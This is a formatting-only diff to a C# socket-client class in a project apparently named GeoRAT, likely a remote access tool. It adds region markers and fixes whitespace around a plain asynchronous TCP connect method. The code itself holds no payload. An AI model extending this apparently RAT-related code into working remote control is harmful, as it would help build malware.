@@ -6,8 +6,7 @@ namespace GeoRAT.Client.Network
 {
     class ClientNetwork
     {
-        //fields and properties
-
+        #region Declarations
         public string Ip { get; private set; } 
         public int Port { get; private set; }
         private Socket ClientSocket;
@@ -17,8 +16,9 @@ namespace GeoRAT.Client.Network
 
         public event Connected OnConnected;
         ////
+        #endregion
 
-            //constructor 
+        #region Constructor
 
         public ClientNetwork(string Ip, int Port)
         {
@@ -28,11 +28,15 @@ namespace GeoRAT.Client.Network
 
         }
 
+        #endregion
+
+        #region Start
+
         public void BeginConnect()
         {
-            
-                ClientSocket.BeginConnect(Ip, Port, ConnectedCallback, null);      
-            
+
+            ClientSocket.BeginConnect(Ip, Port, ConnectedCallback, null);
+
         }
 
         private void ConnectedCallback(IAsyncResult result)
@@ -42,13 +46,15 @@ namespace GeoRAT.Client.Network
                 ClientSocket.EndConnect(result);
                 OnConnected?.Invoke(ClientSocket);
             }
-            catch(Exception e)
+            catch (Exception e)
             {
                 Console.WriteLine(e.Message);
 
             }
-        }
 
+            #endregion
+
+        }
     }
   }
 
